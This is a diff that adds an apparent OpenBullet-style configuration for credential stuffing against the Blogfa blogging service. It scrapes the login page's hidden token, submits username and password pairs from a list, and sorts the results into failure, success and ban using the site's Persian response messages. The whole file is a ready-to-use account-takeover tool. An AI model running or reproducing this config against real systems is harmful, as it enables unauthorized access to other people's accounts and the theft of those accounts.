@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Blogfa",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-07T17:26:17.4693891-08:00",
+  "AdditionalInfo": "",
+  "Author": "@esfelurm",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+
+REQUEST GET "https://www.blogfa.com/desktop/login.aspx" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" value=\"" "\"  name=\"_tt\" >" -> VAR "token" 
+
+FUNCTION URLEncode "<token>" -> VAR "token" 
+
+REQUEST POST "https://blogfa.com/desktop/login.aspx" 
+  CONTENT "_tt=<token>&usrid=<USER>&ups=<PASS>&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "کلمه عبور را اشتباه وارد کرده اید" 
+    KEY "خطا: نام کاربری وجود ندارد، ممکن است آنرا درست وارد نکرده باشید" 
+  KEYCHAIN Success OR 
+    KEY "خروج" 
+  KEYCHAIN Ban OR 
+    KEY "در حال حاضر به دلیل حفظ امنیت کاربران امکان ورود به بخش مدیریت را ندارید" 
